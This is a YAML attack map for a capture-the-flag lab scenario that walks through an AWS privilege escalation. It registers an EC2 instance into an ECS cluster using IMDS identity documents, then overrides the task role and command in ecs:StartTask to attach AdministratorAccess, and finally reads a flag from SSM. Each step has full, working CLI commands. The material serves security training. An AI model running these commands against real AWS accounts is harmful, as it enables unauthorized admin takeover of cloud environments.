attackMap:
  nodes:
    - id: starting-principal
      label: "Instance Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-instance-role"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This is the IAM role attached to an EC2 instance -- in practice, you have obtained
        Remote Code Execution (RCE) on that instance, giving you access to the role's
        temporary credentials via the Instance Metadata Service (IMDS). The role has
        ecs:RegisterContainerInstance, ecs:StartTask, iam:PassRole (to the admin target role
        and the execution role), and ecs:DeregisterContainerInstance permissions.

    - id: ec2-instance
      label: "Unregistered EC2"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/INSTANCE_ID"
      description: >
        An ECS-optimized EC2 instance with the ECS agent installed but configured to point
        to a non-existent holding cluster, making it effectively unregistered. The attacker
        can register this instance directly to the target cluster by calling
        ecs:RegisterContainerInstance with the instance's cryptographically signed identity
        document retrieved from IMDS, then reconfigure the ECS agent to connect with full
        capability attributes needed for task placement.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. The attacker
        passes this role via the taskRoleArn override in ecs:StartTask, causing the ECS container
        to run with full administrative credentials. The container command is also overridden to
        attach AdministratorAccess to the instance role, completing the privilege escalation.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ecs-007-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: ec2-instance
      label: "ecs:RegisterContainerInstance"
      description: >
        The attacker retrieves the instance identity document and its cryptographic signature
        from IMDS (169.254.169.254), then calls ecs:RegisterContainerInstance directly via
        the AWS API to register this EC2 instance into the target ECS cluster. The cluster
        was previously empty with no container instances. After registration, the ECS agent
        is reconfigured and restarted to connect to the cluster with full capability attributes
        required for task placement.
      hints:
        - "Call ecs:RegisterContainerInstance with the signed instance identity document and signature from IMDS (169.254.169.254/latest/dynamic/instance-identity/) to register the EC2 instance directly to the target cluster via the API, bypassing the ECS agent's cluster config. Then reconfigure /etc/ecs/ecs.config to point to the target cluster and restart the ECS agent so it connects with full capability attributes required for task placement."
        - "Use ecs:StartTask with --overrides to set taskRoleArn to the admin role ARN (iam:PassRole) and override the container command to attach AdministratorAccess to the instance role. The container runs with admin credentials via the task role and makes the IAM API call on your behalf."
        - "Browse to https://pathfinding.cloud/paths/ecs-007 for technique details and the original research at https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path"
      commands:
        - description: "Retrieve the instance identity document from IMDS"
          command: "IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)"
        - description: "Retrieve the instance identity document signature from IMDS"
          command: "IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\\n')"
        - description: "Calculate instance resources for registration"
          command: "TOTAL_CPU=$(($(nproc --all) * 1024)); TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')"
        - description: "Register the EC2 instance to the target cluster via direct API call"
          command: "aws ecs register-container-instance --cluster pl-prod-ecs-007-cluster --instance-identity-document \"$IDENTITY_DOC\" --instance-identity-document-signature \"$IDENTITY_SIG\" --total-resources '[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]' --query 'containerInstance.containerInstanceArn' --output text"
        - description: "Reconfigure the ECS agent to point to the target cluster and restart it"
          command: "sed -i 's/pl-prod-ecs-007-holding/pl-prod-ecs-007-cluster/' /etc/ecs/ecs.config && systemctl restart ecs"

    - from: ec2-instance
      to: target-role
      label: "ecs:StartTask + iam:PassRole"
      description: >
        With a container instance now registered in the cluster, call ecs:StartTask targeting
        the pre-existing task definition. Use the --overrides parameter to substitute two
        things at runtime: the taskRoleArn (set to the admin target role via iam:PassRole)
        and the container command (set to attach AdministratorAccess to the instance role).
        The ECS task runs with full admin credentials and completes the privilege escalation.
      hints: []
      commands:
        - description: "Find the container instance ARN registered to the cluster"
          command: "CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster --query 'containerInstanceArns[0]' --output text)"
        - description: "Build the overrides JSON -- override the task role to the admin role and the command to attach AdministratorAccess to the instance role"
          command: "OVERRIDES='{\"taskRoleArn\":\"arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role\",\"containerOverrides\":[{\"name\":\"pl-prod-ecs-007-benign-container\",\"command\":[\"iam\",\"attach-role-policy\",\"--role-name\",\"pl-prod-ecs-007-to-admin-instance-role\",\"--policy-arn\",\"arn:aws:iam::aws:policy/AdministratorAccess\"]}]}'"
        - description: "Start the task with the overrides applied"
          command: "aws ecs start-task --cluster pl-prod-ecs-007-cluster --task-definition pl-prod-ecs-007-existing-task --container-instances \"$CONTAINER_INSTANCE_ARN\" --overrides \"$OVERRIDES\" --query 'tasks[0].taskArn' --output text"
        - description: "Monitor task status until STOPPED"
          command: "aws ecs describe-tasks --cluster pl-prod-ecs-007-cluster --tasks \"$TASK_ARN\" --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'"
        - description: "Verify administrator access after IAM propagation"
          command: "aws iam list-users --max-items 3"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With AdministratorAccess now attached to the instance role, retrieve the scenario
        flag from SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all
        parameters in the account, so no additional permissions are needed beyond the admin
        access gained from the previous step.
      hints:
        - "Use ssm:GetParameter with the full parameter path to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ecs-007-to-admin --query 'Parameter.Value' --output text"
